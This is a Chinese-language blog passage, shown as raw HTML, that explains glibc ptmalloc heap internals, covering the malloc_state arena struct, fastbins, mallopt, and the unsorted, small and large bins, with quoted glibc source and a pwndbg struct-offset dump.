class="code"><pre><code class="hljs c"><span class="hljs-type">void</span>* <span class="hljs-title function_">malloc</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">free</span> <span class="hljs-params">(<span class="hljs-type">void</span>* ptr)</span>;<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20221018120411190.png" alt="image-20221018120411190"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> chunk2mem(p)   ((void*)((char*)(p) + 2*SIZE_SZ))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</span><br></code></pre></td></tr></table></figure><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>每个线程只有一个 arena header， 里面保存了bins ，top chunk等信息。主线程的main_arena保存在libc.so的数据段里，其他线程的arena 则保存在给该arena分配的heap里面。malloc_state定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   have_fastchunks indicates that there are probably some fastbin chunks.</span><br><span class="hljs-comment">   It is set true on entering a chunk into any fastbin, and cleared early in</span><br><span class="hljs-comment">   malloc_consolidate.  The value is approximate since it may be set when there</span><br><span class="hljs-comment">   are no fastbin chunks, or it may be clear even if there are fastbin chunks</span><br><span class="hljs-comment">   available.  Given it&#x27;s sole purpose is to reduce number of redundant calls to</span><br><span class="hljs-comment">   malloc_consolidate, it does not affect correctness.  As a result we can safely</span><br><span class="hljs-comment">   use relaxed atomic accesses.</span><br><span class="hljs-comment"> */</span><br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br>    <span class="hljs-comment">/* Serialize access.  */</span><br>    __libc_lock_define (, mutex);<br><br>    <span class="hljs-comment">/* Flags (formerly in max_fast).  */</span><br>    <span class="hljs-type">int</span> flags;<br><br>    <span class="hljs-comment">/* Set if the fastbin chunks contain recently inserted free blocks.  */</span><br>    <span class="hljs-comment">/* Note this is a bool but not all targets support atomics on booleans.  */</span><br>    <span class="hljs-type">int</span> have_fastchunks;<br><br>    <span class="hljs-comment">/* Fastbins */</span><br>    mfastbinptr fastbinsY[NFASTBINS];<br><br>    <span class="hljs-comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span><br>    mchunkptr top;<br><br>    <span class="hljs-comment">/* The remainder from the most recent split of a small request */</span><br>    mchunkptr last_remainder;<br><br>    <span class="hljs-comment">/* Normal bins packed as described above */</span><br>    mchunkptr bins[NBINS * <span class="hljs-number">2</span> - <span class="hljs-number">2</span>];<br><br>    <span class="hljs-comment">/* Bitmap of bins */</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[BINMAPSIZE];<br><br>    <span class="hljs-comment">/* Linked list */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><br>    <span class="hljs-comment">/* Linked list for free arenas.  Access to this field is serialized</span><br><span class="hljs-comment">       by free_list_lock in arena.c.  */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><br>    <span class="hljs-comment">/* Number of threads attached to this arena.  0 if the arena is on</span><br><span class="hljs-comment">       the free list.  Access to this field is serialized by</span><br><span class="hljs-comment">       free_list_lock in arena.c.  */</span><br>    INTERNAL_SIZE_T attached_threads;<br><br>    <span class="hljs-comment">/* Memory allocated from the system in this arena.  */</span><br>    INTERNAL_SIZE_T system_mem;<br>    INTERNAL_SIZE_T max_system_mem;<br>&#125;;<br><br><br><span class="hljs-comment">/* There are several instances of this struct (&quot;arenas&quot;) in this</span><br><span class="hljs-comment">   malloc.  If you are adapting this malloc in a way that does NOT use</span><br><span class="hljs-comment">   a static or mmapped malloc_state, you MUST explicitly zero-fill it</span><br><span class="hljs-comment">   before using. This malloc relies on the property that malloc_state</span><br><span class="hljs-comment">   is initialized to all zeroes (as is true of C statics).  */</span><br><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> <span class="hljs-title">main_arena</span> =</span><br>        &#123;<br>                .mutex = _LIBC_LOCK_INITIALIZER,<br>                .next = &amp;main_arena,<br>                .attached_threads = <span class="hljs-number">1</span><br>        &#125;;<br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c">pwndbg&gt; ptype /o <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span></span><br><span class="hljs-class">/* <span class="hljs-title">offset</span>      |    <span class="hljs-title">size</span> */  <span class="hljs-title">type</span> =</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> &#123;</span><br><span class="hljs-comment">/*      0      |       4 */</span>    <span class="hljs-type">__libc_lock_t</span> mutex;<br><span class="hljs-comment">/*      4      |       4 */</span>    <span class="hljs-type">int</span> flags;<br><span class="hljs-comment">/*      8      |       4 */</span>    <span class="hljs-type">int</span> have_fastchunks;<br><span class="hljs-comment">/* XXX  4-byte hole      */</span><br><span class="hljs-comment">/*     16      |      80 */</span>    mfastbinptr fastbinsY[<span class="hljs-number">10</span>];<br><span class="hljs-comment">/*     96      |       8 */</span>    mchunkptr top;<br><span class="hljs-comment">/*    104      |       8 */</span>    mchunkptr last_remainder;<br><span class="hljs-comment">/*    112      |    2032 */</span>    mchunkptr bins[<span class="hljs-number">254</span>];<br><span class="hljs-comment">/*   2144      |      16 */</span>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> binmap[<span class="hljs-number">4</span>];<br><span class="hljs-comment">/*   2160      |       8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-comment">/*   2168      |       8 */</span>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">malloc_state</span> *<span class="hljs-title">next_free</span>;</span><br><span class="hljs-comment">/*   2176      |       8 */</span>    <span class="hljs-type">size_t</span> attached_threads;<br><span class="hljs-comment">/*   2184      |       8 */</span>    <span class="hljs-type">size_t</span> system_mem;<br><span class="hljs-comment">/*   2192      |       8 */</span>    <span class="hljs-type">size_t</span> max_system_mem;<br><br>                               <span class="hljs-comment">/* total size (bytes): 2200 */</span><br>                             &#125;<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20221018191719463.png" alt="image-20221018191719463"></p><ul><li><p>mutex：序列化对一个竞技场的访问。Malloc在向 arena 请求堆内存之前锁定了 arena 的 mutex</p></li><li><p>flags：保存信息，如一个 arena 的堆内存是否连续等</p></li><li><p>have_fastchunks：被视为一个 bool 值，表示 fastbins 是否为空，当一个块被链接到一个 fastbin 中时被设置，并由 malloc_consolidate() 清除 这个字段和它后面的填充DWORD只存在于GLIBC版本&gt;=2.27。在GLIBC版本&lt;=2.26中，它是flags字段的一部分。</p></li><li><p>fastbinsY[NFASTBINS]：存放每个 fast chunk 链表头部的指针。尽管在默认情况下只有7个这样的fastbins可用，但 mallopt() 函数可以通过修改 global_max_fast 变量来改变这个数字。</p></li><li><p>top：top chunk 是最顶部的可用 chunk，即与可用内存的末端接壤的那个，在一个新的 arena 被初始化后，一个 top chunk 总是存在的，而且每个 arena 只有一个。只有当请求无法从同一 arena 的任何其他 bin 中得到服务时，才会从 top chunk 中得到服务。当一个 top chunk 太小，无法满足低于 mmap 阈值的请求时，malloc 会尝试通过 sysmalloc() 函数增加 top chunk 所在的堆，然后扩展 top chunk。如果不成功，就会分配一个新的堆，成为该 arena 的 top chunk，而旧的t op chunk 中的任何剩余内存都会被释放。为了达到这个目的，malloc在堆的末端放置了2个0x10大小的 “栅栏柱 “块，以确保向前合并的尝试不会导致越界读取。</p></li><li><p>last_remainder：这个字段持有前一个切割操作产生的块的地址。它由属于 smallbin 范围的请求填充，该请求来自 unsorted bin (来自现有的 last_remainder)，或来自binmap搜索。要从一个 unsorted bin 中进行切割，最后的剩余块必须位于 unsorted bin的头部。</p><p>分割：例如，在请求一个0x100大小的块时，如果线程的 arena 只有一个0x300大小的块可以提供， malloc将从它的空闲列表中解开0x300块，从中分割出一个0x100块，将所谓的剩余部分（一个 0x200大小的块）链接到未排序bin的头部，然后分配0x100块。</p><p>耗尽：如果一个线程请求一个0x80大小的块，而它的 arena 只有一个0x90大小的块可用，malloc会通过分配整个块而不是重新分配来 “耗尽 “这个0x90块。这是因为在从0x90块中取出0x80字节后 ，没有足够的空间留给一个最小尺寸的块。</p></li><li><p>bins[NBINS * 2 - 2]：用于存储 unstored bin，small bins 和 large bins 的 chunk 链表。</p></li><li><p>binmap[BINMAPSIZE]：binmap 是个位向量，它可以表示 arena 的 smallbins 和 largebins 哪些被占用。当一个请求无法从其相应的 bin 中得到服务时。它被malloc用来快速找到下一个最大的、且有值的 bin。Binmap搜索发生在不成功的unsortedbin或largebin搜索之后，这取决于请求大小。Malloc找到下一个最大的、被占用的bin，并耗尽/切割 该bin中的最后一个块，在后一种情况下，如果请求是在small bin范围内，剩余部分被写入 last_remainder。</p></li><li><p>next：arena 的单链循环列表的下一个。</p></li><li><p>*next_free：一个单链的、非循环的自由 arena 列表（没有连接线程的 arena）。</p></li><li><p>attached_threads：同时使用这个竞技场的线程数量。</p></li><li><p>system_mem：目前该 arena 映射的可写内存总量。</p></li><li><p>max_system_mem：这个 arena 在任何时候所映射的最大的可写内存量。</p></li></ul><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Fastbins</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    An array of lists holding recently freed small chunks.  Fastbins</span><br><span class="hljs-comment">    are not doubly linked.  It is faster to single-link them, and</span><br><span class="hljs-comment">    since chunks are never removed from the middles of these lists,</span><br><span class="hljs-comment">    double linking is not necessary. Also, unlike regular bins, they</span><br><span class="hljs-comment">    are not even processed in FIFO order (they use faster LIFO) since</span><br><span class="hljs-comment">    ordering doesn&#x27;t much matter in the transient contexts in which</span><br><span class="hljs-comment">    fastbins are normally used.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    Chunks in fastbins keep their inuse bit set, so they cannot</span><br><span class="hljs-comment">    be consolidated with other free chunks. malloc_consolidate</span><br><span class="hljs-comment">    releases all chunks in fastbins and consolidates them with</span><br><span class="hljs-comment">    other free chunks.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span><br><br><span class="hljs-comment">/* offset 2 to use otherwise unindexable first 2 bins */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fastbin_index(sz) \</span><br><span class="hljs-meta">  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">0x30 = 0011 0000 &gt;&gt; 4 -&gt; 0000 0011 -&gt; 3 - 2 = 1</span><br><span class="hljs-comment">0xa0 = 1010 0000 &gt;&gt; 4 -&gt; 0000 1010 -&gt; 10 - 2 = 8</span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-comment">/* The maximum fastbin request size we support */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_FAST_SIZE     (80 * SIZE_SZ / 4)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NFASTBINS  (fastbin_index (request2size (MAX_FAST_SIZE)) + 1)</span><br><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Set value of max_fast.</span><br><span class="hljs-comment">   Use impossibly small value if 0.</span><br><span class="hljs-comment">   Precondition: there are no existing fastbin chunks.</span><br><span class="hljs-comment">   Setting the value clears fastchunk bit but preserves noncontiguous bit.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_max_fast(s) \</span><br><span class="hljs-meta">  global_max_fast = (((s) == 0)                              \</span><br><span class="hljs-meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_max_fast() global_max_fast</span><br><br><span class="hljs-comment">/* Maximum size of memory handled in fastbins.  */</span><br><span class="hljs-type">static</span> INTERNAL_SIZE_T global_max_fast;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">malloc_init_state</span><span class="hljs-params">(mstate av)</span> &#123;<br>    ...<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast (DEFAULT_MXFAST);<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20221018141013527.png" alt="image-20221018141013527"></p><p>它是一个单链的、非循环链表的集合，每个列表容纳特定大小的 chunk。每个 arena 有 10 个 fastbin，每个负责持有大小为 0x20 到 0xb0 的块。例如，一个 0x20 的 fastbin 只保存 0x20 大小的空闲块，而一个 0x30 的 fastbin 只能容纳大小为 0x30 的空闲块，等等。尽管在默认情况下只有7个 这样的 fastbins 可用，但 <code>mallopt()</code> 函数可以通过修改global_max_fast变量来改变这个数字。</p><p>每个fastbin的头部驻留在它的 arena 上，尽管该bin中的后续块之间的链接是内联存储的。当一 个块的用户数据的第一个四字节被链接到一个fastbin中时，它被重新使用为一个前向指针（ fd）。一个空的fd表示一个fastbin中的最后一个块。</p><p>Fastbins是后进先出(LIFO)的结构，将一个块释放到一个fastbin中，会将其链接到该fastbin的头部。同样地，请求与非空fastbin相匹配的大小的块，将导致在该fastbin的头部分配该块。</p><p>如果对应的tcachebin已经满了，空闲的chunks会直接链接到对应的fastbin。当请求的大小在 fastbin范围内时，在tcache搜索之后，在任何其他bins搜索之前，进行fastbin搜索。</p><figure class="highlight v"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs v"><span class="hljs-keyword">int</span> __libc_mallopt(<span class="hljs-keyword">int</span> param_number, <span class="hljs-keyword">int</span> value) &#123;<br>    mstate av = &amp;main_arena;<br>    <span class="hljs-keyword">int</span> res = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">if</span> (__malloc_initialized &lt; <span class="hljs-number">0</span>)<br>        ptmalloc_init();<br>    __libc_lock_lock(av-&gt;mutex);<br><br>    LIBC_PROBE(memory_mallopt, <span class="hljs-number">2</span>, param_number, value);<br><br>    <span class="hljs-comment">/* We must consolidate main arena before changing max_fast</span><br><span class="hljs-comment">       (see definition of set_max_fast).  */</span><br>    malloc_consolidate(av);<br><br>    switch (param_number) &#123;<br>        <span class="hljs-keyword">case</span> M_MXFAST:<br>            <span class="hljs-keyword">if</span> (value &gt;= <span class="hljs-number">0</span> &amp;&amp; value &lt;= MAX_FAST_SIZE) &#123;<br>                LIBC_PROBE(memory_mallopt_mxfast, <span class="hljs-number">2</span>, value, get_max_fast());<br>                set_max_fast (value);<br>            &#125; <span class="hljs-keyword">else</span><br>                res = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_TRIM_THRESHOLD:<br>            do_set_trim_threshold(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_TOP_PAD:<br>            do_set_top_pad(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_MMAP_THRESHOLD:<br>            res = do_set_mmap_threshold(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_MMAP_MAX:<br>            do_set_mmaps_max(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_CHECK_ACTION:<br>            do_set_mallopt_check(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_PERTURB:<br>            do_set_perturb_byte(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_ARENA_TEST:<br>            <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">0</span>)<br>                do_set_arena_test(value);<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> M_ARENA_MAX:<br>            <span class="hljs-keyword">if</span> (value &gt; <span class="hljs-number">0</span>)<br>                do_set_arena_max(value);<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>    __libc_lock_unlock(av-&gt;mutex);<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* addressing -- note that bin_at(0) does not exist */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> bin_at(m, i) \</span><br><span class="hljs-meta">  (mbinptr) (((char *) &amp;((m)-&gt;bins[((i) - 1) * 2]))                  \</span><br><span class="hljs-meta">             - offsetof (struct malloc_chunk, fd))</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Unsorted chunks</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    All remainders from chunk splits, as well as all returned chunks,</span><br><span class="hljs-comment">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span><br><span class="hljs-comment">    in regular bins after malloc gives them ONE chance to be used before</span><br><span class="hljs-comment">    binning. So, basically, the unsorted_chunks list acts as a queue,</span><br><span class="hljs-comment">    with chunks being placed on it in free (and malloc_consolidate),</span><br><span class="hljs-comment">    and taken off (to be either used or placed in bins) in malloc.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span><br><span class="hljs-comment">    does not have to be taken into account in size comparisons.</span><br><span class="hljs-comment"> */</span><br><br><span class="hljs-comment">/* The otherwise unindexable 1-bin is used to hold unsorted chunks. */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unsorted_chunks(M)          (bin_at (M, 1))</span><br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20221018143836059.png" alt="image-20221018143836059"></p><p>unsorted bin是一个双链的循环列表，它可以容纳任何大小的空闲块。unsorted bin的头部和尾部位于其 arena 上，而bin中后续块之间的fd和bk链接则存储在堆内。</p><p>当对应的tcachebin已满，或超出tcache大小范围（默认情况下为0x420及以上）时，free chunks会直接链接到unsortedbin的头部。在没有tcache的GLIBC编译版本中（GLIBC默认版本 &lt;=2.25），当自由块超出fastbin大小范围（默认情况下为0x90及以上）时，会直接链接到 unsorted bin的头部。</p><p>当请求的大小在tcache、fastbins和smallbins 搜索之后，但在largebins搜索之前，unsorted bin 会被搜索到。unsorted bin搜索从bin的尾部开始，然后向头部移动，如果一个块正好符合规范化的请求大小，它就会被分配，搜索就会停止，否则它就会被分类到相应的smallbin或largebin中。</p><p>如果在unsorted bin扫描过程中被检查的块不是完全匹配的，但是是最后的剩余，并且大到可以再次剩余，那么它就被剩余。这个剩余操作的结果的块被链接回unsorted bin的头部。</p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> NBINS             128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> NSMALLBINS         64</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_WIDTH    MALLOC_ALIGNMENT</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SMALLBIN_CORRECTION (MALLOC_ALIGNMENT &gt; 2 * SIZE_SZ)</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> in_smallbin_range(sz)  \</span><br><span class="hljs-meta">  ((unsigned long) (sz) &lt; (unsigned long) MIN_LARGE_SIZE)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> smallbin_index(sz) \</span><br><span class="hljs-meta">  ((SMALLBIN_WIDTH == 16 ? (((unsigned) (sz)) &gt;&gt; 4) : (((unsigned) (sz)) &gt;&gt; 3))\</span><br><span class="hljs-meta">   + SMALLBIN_CORRECTION)</span><br></code></pre></td></tr></table></figure><p><img src="Heap.assets/image-20221018144012079.png" alt="image-20221018144012079"></p><p>Smallbins是一个双重链接的循环列表，每个列表都持有特定大小的free chunk。每个arena有62 个smallbins，每个负责保存大小为0x20到0x3f0的自由块，与fastbin的大小重叠。例如，一个 0x20的 small bin只保存大小为0x20的自由块，而一个0x3c0的 small bin只保存大小为0x3c0的自由块等等。</p><p>每个 small bin 的头部驻留在它的 arena 中，尽管其中的后续块之间的链接是通过内联存储。当排序发生时，自由块只通过其 arena 的 unsorted bin 链接到其相应的 small bin。当一个块被链接到一 个 samll bin 中时，其用户数据的第一个四字被重新用作前向指针（fd），第二个四字被重新用作后向指针（bk）。</p><p>Smallbins是先进先出（FIFO）的结构，将一个块分到一个smallbin中，会将其链接到该smallbin 的头部。同样地，请求与一个非空的 samll bin相匹配的大小的块，将导致从该 small bin 的尾部分配一个块。</p><p>Smallbin 搜索在 tcache 搜索之后进行。</p><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MIN_LARGE_SIZE    ((NSMALLBINS - SMALLBIN_CORRECTION) * SMALLBIN_WIDTH)</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">    Larger bins are approximately logarithmically spaced:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">    32 bins of size      64</span><br><span class="hljs-comment">    16 bins of size     512</span><br><span class="hljs-comment">     8 bins of size    4096</span><br><span class="hljs-comment">     4 bins of size   32768</span><br><span class="hljs-comment">     2 bins of size  262144</span><br><span class="hljs-comment">     1 bin  of size what&#x27;s left</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> largebin_index_32(sz)                                                \</span><br><span class="hljs-meta">  (((((unsigned long) (sz)) &gt;&gt; 6) <span class="hljs-string">&lt;= 38) ?  56 + (((unsigned long) (sz)) &gt;</span>&gt; 6) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 9) <span class="hljs-string">&lt;= 20) ?  91 + (((unsigned long) (sz)) &gt;</span>&gt; 9) :\</span><br><span class="hljs-meta">   ((((unsigned long) (sz)) &gt;&gt; 12) <span class="hljs-string">&lt;= 10) ? 110 + (((unsigned long) (sz)) &gt;</span>&gt; 12) :\</span><br><span 